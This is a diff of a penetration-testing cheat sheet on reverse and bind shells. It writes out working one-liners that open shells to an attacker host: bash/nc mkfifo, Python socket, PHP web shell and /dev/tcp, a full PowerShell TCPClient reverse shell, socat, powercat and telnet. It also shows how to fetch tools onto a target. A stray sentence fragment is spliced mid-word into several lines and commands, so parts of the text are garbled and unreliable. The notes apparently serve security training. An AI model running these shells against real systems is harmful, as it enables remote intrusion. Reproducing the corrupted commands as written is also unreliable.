@@ -7,63 +7,7 @@ Generate reverse shells with [revshells](https://www.revshells.com/).
 
 Another cheatsheet from [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
 
-# Shell Stablisation Methods
-
-Netcat shell stablisation
-```bash
-//python trick
-//python2|3 remember!
-python -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
-CTRL+Z
-stty raw -echo; fg
-```
-OR
-```bash
-//rlwrap trick
-sudo apt install rlwrap
-rlwrap nc -lvnp <port>
-```
-OR
-stepto-socat trick
-```bash
-sudo python3 -m http.server 80
-wget <local-ip>/socat -0 /tmp/socat
-````
-IF WINDOWS
-```powershell
-Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
-```
-
-# Shells
-
-## Linux Shells
-
-bash nc -e workaround
-```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
-```
-
-python
-```python
-python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ip", port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);`
-
-'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f")'
-```
-
-php
-```php
-file "<?php system($_GET['cmd']);?>"
-"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ip/port 0>&1'");?>"
-```
-
-## Windows 
-
-[windows php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
-
-
 # Shells 101
-
 A shell is command line or grapical user interface of a system, the outermost layer to interact with it.
 
 Quick useful list of linux networking commands help
@@ -88,10 +32,60 @@ powershell -c "Invoke-WebRequest -Uri http://$attackbox:$port/shell.exe" -outfil
 Bind DEFINE: opposite to a reverse shell. The listener is on the target machine.
 
 Reverse DEFINE: opposite to a bind shell. The listener is on the attacker machine.
+## Linux Shells
+bash nc -e workaround
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
+```
 
+python
+```python
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ip", port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);`
+
+'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f")'
+```
+
+php
+```php
+file "<?php system($_GET['cmd']);?>"
+"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ip/port 0>&1'");?>"
+```
+
+## Windows 
+
+[windows php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
+
+# Shell Stablisation Methods
+
+Netcat shell stablisation
+```bash
+//python trick
+//python2|3 remember!
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Shells
+CTRL+Z
+stty raw -echo; fg
+```
+OR
+```bash
+//rlwrap trick
+sudo apt install rlwrap
+rlwrap nc -lvnp <port>
+```
+OR
+stepto-socat trick
+```bash
+sudo python3 -m http.server 80
+wget <local-ip>/socat -0 /tmp/socat
+````
+IF WINDOWS
+```powershell
+Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
+```
 
 ## Netcat
-
+[[Netcat-Cheatsheet]] and [[Netcat-As-Recon]]
 ### Connecting
 -n skips dns name resolution
 -v verbose
@@ -165,7 +159,7 @@ ncat -nlvp $PORT | tar xf -
 
 
 ## Socat 
-Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features.
+Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features. See the [[Socat-Cheatsheet]]
 
 [socat](https://linux.die.net/man/1/socat)
 
@@ -180,6 +174,7 @@ socat - TCP4:<remoteIP>:PORT
 socat TCP4-LISTEN:8080 STDOUT
 
 socat TCP4:ip:port EXEC:/bin/bash
+# Shells
 ```
 
 ### Reverse Shells
@@ -231,7 +226,7 @@ socat TCP4-LISTEN:$PORT,fork file:$filename
 ```bash
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
-1. pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+1. pty, allocates a pseudoterminal on the target -- part of the stabation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toilisation process
 1. stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
 1. sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
 1. setsid, creates the process in a new session
@@ -250,7 +245,7 @@ req indicates that this is a certificate signing request.
 -days 365 shows that the validity of our certificate will be one year
 -subj sets data, such as organization and country, via the command-line.
 -nodes simplifies our command and does not encrypt the private key
--keyout `PRIVATE\_KEY` specifies the filename where we want to save our private key
+-keyout `PRIVATE\_KEY` specifies the filename where we want toation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to save our private key
 -out CERTIFICATE specifies the filename to which we want to write the certificate request
 
 Merge the two files:
@@ -262,7 +257,7 @@ Setup reverse shell listener
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # verify=0 means dont bother trying to validate cert
 ```
 The same for bind shell
-```
+```ation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # For windows after:" ,verify=0 EXEC='cmd.exe' "
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 ```bash
@@ -276,7 +271,7 @@ socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe
 Flags:
 ```bash
 -i      access with private key
--L      local_port:remote_address:remote_port # for local port fowarding
+-L      local_port:remote_address:remote_port # for local portation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to fowarding
 -R      port:loca_address:local_port # For remote port forwarding 
 -D      local_PORT # Dynamic port fowarding, creates sockets proxy on localhost
 -N      Do not execute a remote command. Useful in for just forwardin ports
@@ -287,20 +282,48 @@ Kali Config
 
 ssh Server:
 ```bash
-netstat -antp | grep sshd
+netstat -antp | grep sshdation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to
 systemctl enable ssh
 systemctl disable ssh
 ```
 
 ## Powershell
-### Bind shell
+For more customisation [[Basic_Powershell]] or [[Useful_Powershell]].
+### Powershell Reverse Shell
 ```powershell
-powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
 ```
+Enclose with:
+```powershell
+ powershell -c "<code>"
+```
+For the one liner
+
+### Powershell Bind Shell
+Remember to change local addresss accordingly, some localhosts won't be `0.0.0.0`
+```powershell
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.ation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toStop()
+```
+Enclose with:
+```powershell
+ powershell -c "<code>"
+```
+For the one liner.
 Then `nc -nv $IP $PORT` in...
 
 ### Remoting with Powershell
-
 Generally you must be administrator to `Enable-PSRemoting`, and require configuration of TrustedHosts:  
 ```powershell
 Get-ChildItem -path WSMan:\Localhost # Find the WSman:\
@@ -310,6 +333,19 @@ Connecting
 ```powershell
 Invoke-Command -ComputerName <remote-address> -Scriptblock {  } - Credential <username> # to attempt to connect and execute a scriptblock
 Enter-PSSession -ComputerName <remote-address> -Credential <username> # Establishes a remote shell
+```
+
+## Powercat
+A Powershell clone of Netcat exists. Archive cheatsheet is here [[Powercat-Cheatsheet]], excerpts about shell are here too.
+
+Reverse shell:
+```powershell
+powercat -c 10.10.10.10 -p 54321 -e cmd.exe
+```
+
+Bind Shell
+```powershell
+powercat -l -p 1337 -e cmd.exe
 ```
 
 ## PsExec
@@ -347,7 +383,8 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
     -l, --log                        Log the WinRM session
     -h, --help                       Display this help message
 ```
-## MSFvenom and Metasploit
+
+ation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to## MSFvenom and Metasploit
 Nice links:
 [The great g0tmi1k's payload creator](https://github.com/g0tmi1k/msfpc)
 [Common One Liners by Frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
@@ -387,7 +424,6 @@ exploit
 ```
 
 ## Telnet-to-Telnet
-
 ```bash
 # Target
 telnet $IP 9090 | /bin/bash | telnet $IP 9999
